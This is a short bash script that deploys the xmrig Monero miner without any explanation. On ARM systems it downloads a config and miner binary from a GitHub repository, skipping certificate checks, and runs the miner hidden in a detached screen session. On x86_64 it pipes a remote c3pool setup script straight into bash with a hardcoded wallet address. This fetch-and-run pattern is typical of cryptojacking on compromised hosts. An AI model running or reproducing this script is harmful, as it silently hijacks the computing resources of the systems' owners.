#!/bin/bash
  OS=$(uname -m)
  if [[ ${OS} == "aarch64" ]]; then
  wget -N --no-check-certificate -q -O config.json https://raw.githubusercontent.com/gcp5678/smithmlo/main/config.json && chmod 666 config.json
  config="//config.json"
  name=$(hostname)
  sed -i "s/6666/${name}/g" ${config}
  wget -N --no-check-certificate -q -O xmrig https://raw.githubusercontent.com/gcp5678/smithmlo/main/armxmrig && chmod 755 xmrig
  screen -dmS xmrig ./xmrig
  fi
  if [[ ${OS} == "x86_64" ]]; then
 curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 46MVgvFXbVZNvpAKrQPSWgevqqANgadFGTq2ocvZ5SjkT7vmLdLyKJ5eUgZrstVLExM8Q9ZsPyuRECfTDEmf2EwVDTBfdpZ
 fi
 
